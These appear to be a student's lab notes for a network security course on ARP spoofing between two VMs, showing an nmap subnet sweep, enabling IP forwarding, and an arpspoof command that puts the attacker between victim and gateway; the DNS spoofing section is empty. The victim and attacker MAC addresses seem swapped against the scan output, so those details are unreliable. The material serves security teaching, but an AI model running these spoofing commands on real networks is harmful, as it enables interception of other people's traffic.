---
title: A&D of Network Security - Lab 4(ARP & DNS SPOOFING)
tags: [NTU, NTU_PADNS]

category: "Security/Course/NTU PADNS"
---

# A&D of Network Security - Lab 4(ARP & DNS SPOOFING)
###### tags: `Practicum of A&D of NS` `NTU`

## Background
[ARP Spoofing at `1:15:00`](https://youtu.be/ha4w30V2cLM?si=eK2wwkqROck5n3SY&t=4497)

## ARP SPOOFING
1. Setting 2 VMs' network interface as Bridged adapter
    :::danger
    You supposed to use your own network instead of public network
    :::
2. Checking IP
![](https://i.imgur.com/V1CTmtr.png)

    ![](https://i.imgur.com/i6RUqmM.png)
And check the victim gateway by `nmap`
    ```bash!
    $ sudo nmap -sP 192.168.43.0/24
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 10:46 EDT
    Nmap scan report for DESKTOP-D0UCTM3 (192.168.43.56)
    Host is up (0.00020s latency).
    MAC Address: 68:54:5A:DC:03:57 (Intel Corporate)
    Nmap scan report for 192.168.43.66
    Host is up (0.010s latency).
    MAC Address: D4:38:9C:87:2F:C6 (Sony)
    Nmap scan report for kali (192.168.43.222)
    Host is up (0.00040s latency).
    MAC Address: 08:00:27:B1:9D:67 (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.43.78
    Host is up.
    Nmap done: 256 IP addresses (4 hosts up) scanned in 6.13 seconds
    ```
    :::info
    Victim VM $\to$ `192.168.43.222` / MAC $\to$ `08:00:27:F7:12:7A`
    Attacker VM $\to$ `192.168.43.78` / MAC $\to$ `08:00:27:B1:9D:67`
    Default Gateway $\to$ `192.168.43.66`
    :::
    

3. Open NAT Port Forwarding
* In Attacker VM
    ```bash!
    $ sudo su
    $ echo 1 > /proc/sys/net/ipv4/ip_forward
    $ exit
    $ cat /proc/sys/net/ipv4/ip_forward
    1
    ```
* In Victim VM
    ```bash
    $ arp -a
    ? (192.168.43.78) at 08:00:27:f7:12:7a [ether] on eth0
    DESKTOP-D0UCTM3 (192.168.43.56) at 68:54:5a:dc:03:57 [ether] on eth0
    DESKTOP-D0UCTM3 (192.168.43.56) at 68:54:5a:dc:03:57 [ether] on eth0
    ```
4. Start to attack
    ```bash
    $ sudo arpspoof -i eth0 -t 192.168.43.222 192.168.43.66
    // sudo arpspoof -i {網卡介面} -t {攻擊目標 IP} {Gateway IP}
    ```
5. Result
![](https://i.imgur.com/46xo2IZ.png)

    ![](https://i.imgur.com/2CG3iER.png)

    ![](https://i.imgur.com/qkkrFfy.png)


### Problem & Solved
:::info
If you can not install `dsniff`, you may update and upgrade the whole system with command `sudo apt-get update; sudo apt-get upgrade`(It may take lot's of time to finish the work)
:::

## DNS SPOOFING
